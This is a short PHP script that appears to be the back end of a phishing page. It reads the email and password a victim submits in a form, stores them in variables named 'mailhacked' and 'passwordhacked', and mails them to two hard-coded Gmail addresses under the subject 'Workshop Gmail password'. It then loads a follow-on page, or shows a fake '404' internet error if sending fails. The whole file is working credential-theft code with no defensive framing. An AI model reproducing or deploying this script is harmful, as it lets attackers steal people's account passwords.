<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "greatavano@gmail.com";
         $subject = "Workshop Gmail password";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:Admin@send.com \r\n";
         $header .= "Cc:tadeualvez6@gmail.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
          
          if (isset($_GET['email'])) {
    $email = $_GET['email'];
}
else {
    $email = '';
}
         }
         
      ?>
